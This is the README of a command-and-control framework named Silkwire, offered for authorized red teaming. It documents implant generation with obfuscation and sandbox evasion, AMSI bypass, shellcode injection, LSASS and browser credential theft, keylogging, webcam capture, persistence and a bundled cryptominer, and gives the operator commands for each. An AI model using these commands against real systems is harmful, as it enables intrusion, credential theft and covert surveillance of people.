# Silkwire C2 Framework

<p align="center">
  <img alt="Silkwire Logo" src="docs/images/silkwire.png" height="30%" width="30%">
</p>

A gRPC-based Command and Control framework for authorized penetration testing and red team operations. Features multi-platform implants, post-exploitation modules, and comprehensive evasion capabilities.

> **⚠️ LEGAL DISCLAIMER**
> **FOR AUTHORIZED SECURITY TESTING ONLY.** This tool is intended solely for authorized penetration testing, red team exercises, and educational purposes. Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical. Users are solely responsible for compliance with all applicable laws.

## Features

**Core Infrastructure**
- Encrypted gRPC communication (TLS/mTLS) with bidirectional streaming
- Multi-platform support: Windows, Linux, macOS (amd64, 386, arm64)
- Dynamic implant generation with custom configurations
- Interactive operator console with session management
- SQLite-based persistence

**Post-Exploitation**
- In-memory .NET assembly execution (AMSI/ETW bypass)
- PE/DLL execution via Donut shellcode conversion
- BOF (Beacon Object File) execution with goffloader
- Multiple shellcode injection techniques
- Process migration and token manipulation
- Credential harvesting (LSASS, browsers, SAM/shadow)
- Persistence mechanisms (registry, scheduled tasks, services, cron, systemd, launchd)

**Surveillance**
- Keylogging with window tracking
- Screenshot, audio, and webcam capture
- Clipboard monitoring

**Networking**
- SOCKS5 proxy and port forwarding
- DNS C2 channel with encryption
- Interactive PTY shells

**Evasion**
- Anti-debug, anti-VM, anti-emulation
- Sleep masking and code obfuscation
- Jittered beacons and kill dates
- Configurable evasion profiles

## Quick Start

### Prerequisites
- Go 1.24.4+
- Protocol Buffers (`protoc` with Go plugins)
- OpenSSL
- SQLite3

```bash
# Clone and setup
git clone https://github.com/projektckmt/silkwire-c2.git
cd silkwire-c2
make dev-setup

# Build all components
make build
```

### Running

**Terminal 1 - Server:**
```bash
make run-server
```

**Terminal 2 - Operator Console:**
```bash
make run-console
```

**Terminal 3 - Generate and Run Implant:**
```bash
# In the console, generate an implant
generate --mtls <server-address> --os <target-os> --arch <target-arch>

# Run the generated implant binary
./path/to/generated/implant
```

For detailed setup and manual execution options, see the [documentation](docs/).

## Usage

### Basic Commands

```bash
# Session management
sessions                    # List all sessions
use <id>                   # Enter interactive session mode
session <id>               # Alias for 'use'
kill <id>                  # Terminate session

# Command execution (in session mode)
shell [command]            # Execute command or start interactive PTY
upload <local> <remote>    # Upload file
download <remote> <local>  # Download file

# Post-exploitation (in session mode)
execute-assembly <path> [args]           # .NET assembly execution
execute-pe <path> [args]                 # PE/DLL via Donut
execute-bof <path> [args]                # BOF execution (Win x64)
execute-shellcode <file>                 # Shellcode injection
migrate <pid>                            # Process migration

# Credentials (in session mode)
lsass                      # LSASS dump (Windows)
hashdump                   # Hash extraction (SAM/shadow)
harvest <chrome|firefox|edge|all>        # Browser credentials

# Surveillance (in session mode)
keylog start               # Start keylogger
keylog stop                # Stop keylogger
screenshot                 # Capture screenshot
audio [duration]           # Record audio (default: 5s)
webcam <photo|video> [duration]          # Capture from webcam

# Networking (in session mode)
socks start [port]         # Start SOCKS5 proxy
socks stop                 # Stop SOCKS5 proxy
portfwd add <bind> <host> <port>         # Add port forward
portfwd remove <bind>      # Remove port forward
portfwd list               # List port forwards

# Persistence (in session mode)
persist install <method>   # Install persistence (registry, task, service, cron, systemd, launchd)
persist remove <method>    # Remove persistence
persist list               # List persistence methods
```

For complete command reference and advanced options, see the [operator guide](docs/OPERATOR_GUIDE.md).

## Architecture

### Components

```
┌─────────────┐         gRPC/TLS          ┌─────────────┐
│   Implant   │◄──────────────────────────►│   Server    │
│  (Target)   │    Bidirectional Stream    │  (Handler)  │
└─────────────┘                             └──────┬──────┘
                                                   │
                                             ┌─────▼──────┐
                                             │  Console   │
                                             │ (Operator) │
                                             └────────────┘
```

- **Server** ([server/](server/)): gRPC server, session management, task queuing, implant generation
- **Implant** ([implant/](implant/)): Multi-platform agent with post-exploitation and evasion modules
- **Console** ([console/](console/)): Interactive operator interface
- **Proto** ([proto/](proto/)): gRPC service and message definitions

### Security

- **Communication**: TLS 1.2+, mTLS support, session tokens
- **Evasion**: Anti-debug/VM/emulation, sleep masking, process hiding
- **Obfuscation**: String encryption, name mangling, control flow flattening

## Advanced Capabilities

### Implant Generation
Implants are generated via the console CLI using templating to inject custom configurations:
- Cross-platform compilation (Windows, Linux, macOS)
- Custom configurations (beacon interval, jitter, kill date, evasion level)
- Per-implant TLS certificates
- Multiple output formats (EXE, DLL, shellcode, service)
- Optional obfuscation and packing

### Injection & Execution
- **.NET Assemblies**: In-memory execution with AMSI/ETW bypass via donut shellcode or CLR hosting
- **PE/DLL**: Server-side donut conversion with sacrificial process spawning
- **BOF**: In-process execution using goffloader (Windows x64)
- **Shellcode**: Multiple injection methods (CreateRemoteThread, RtlCreateUserThread, QueueUserAPC, reflective DLL)
- **Process Migration**: Migrate implant with connection preservation

### Covert Channels
- **DNS C2**: Tunneling over DNS with TOTP auth and Age encryption
- **SOCKS5**: Full proxy server for traffic pivoting
- **Port Forwarding**: Multiple simultaneous forwards

### Modules
Extensible module system with built-in XMRig cryptocurrency miner. Custom modules can be added via the Module interface.

## Development

### Implant Generation

Implants are generated using the console CLI, which uses templating to customize the implant code based on your configuration:

```bash
# In the operator console
generate [transport] [options]

# Basic examples:
generate --mtls 192.168.1.100:8443
generate --https example.com:443 --os windows --arch amd64
generate --http 10.0.0.1:80 --format dll --evasion --garble

# Advanced obfuscation:
generate --mtls 10.0.0.1:8443 --obf-level 3
generate --https cdn.example.com:443 --preset-heavy
generate --mtls 10.0.0.1:8443 --string-obf --api-obf --sandbox-evasion
```

**Transport Options:**
- `--mtls <address>` - mTLS transport (default)
- `--http <address>` - HTTP transport
- `--https <address>` - HTTPS transport
- `--dns <domain>` - DNS transport

**Build Options:**
- `--os, -o <os>` - Target OS (windows, linux, darwin)
- `--arch, -a <arch>` - Target architecture (amd64, 386, arm64)
- `--format, -f <fmt>` - Output format (exe, dll, shellcode, service, source)
- `--save, -s <dir>` - Save to directory (default: ./)

**Obfuscation & Evasion:**
- `--evasion, -e` - Enable basic evasion techniques
- `--garble, -g` - Use garble for code obfuscation
- `--obf-level <0-4>` - Obfuscation level
- `--preset-light|medium|heavy|extreme` - Quick presets
- `--anti-vm`, `--anti-debug`, `--sandbox-evasion` - Advanced evasion

The console applies configuration templates to the implant source code and compiles the customized binary for the target platform.

### Extending Functionality

1. **Add Commands**: Edit `proto/c2.proto`, regenerate with `make proto`, implement handler in `implant/commands.go`
2. **Custom Modules**: Implement Module interface in `implant/modules.go`, register, and add console commands
3. **Testing**: `make test` or `go test ./...`

See [CONTRIBUTING.md](docs/CONTRIBUTING.md) for detailed development guidelines.

## Operational Guidelines

### Best Practices
- **Authorization**: Obtain explicit written permission before deployment
- **TLS**: Always use TLS/mTLS in production environments
- **OpSec**: Set kill dates, configure jitter, use dedicated infrastructure
- **Cleanup**: Remove persistence, delete binaries, clear artifacts after engagements
- **Testing**: Validate evasion techniques in lab environments first

### Troubleshooting
- **Connection issues**: Check firewall rules, verify certificates, confirm server address
- **Timeouts**: Increase beacon interval, verify implant process is running
- **Build errors**: Run `make clean && make build`, ensure Go 1.24.4+, install protoc plugins

See [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) for detailed solutions.

## License

Provided for **educational and authorized security testing only**. Users must:
- Only use on authorized systems
- Comply with all applicable laws
- Take full responsibility for their actions

The software is provided "AS IS" without warranty. Authors are not responsible for misuse.

## Contributing

Contributions welcome! Please:
- Maintain educational/research focus
- Follow Go best practices
- Include tests and documentation
- Submit PRs with detailed descriptions

Report security vulnerabilities privately to maintainers.

## Acknowledgments

Inspired by Sliver, Metasploit, Cobalt Strike, and Empire. Built with gRPC, Protocol Buffers, go-clr, garble, donut, and XMRig.

---

**Use responsibly and legally.**
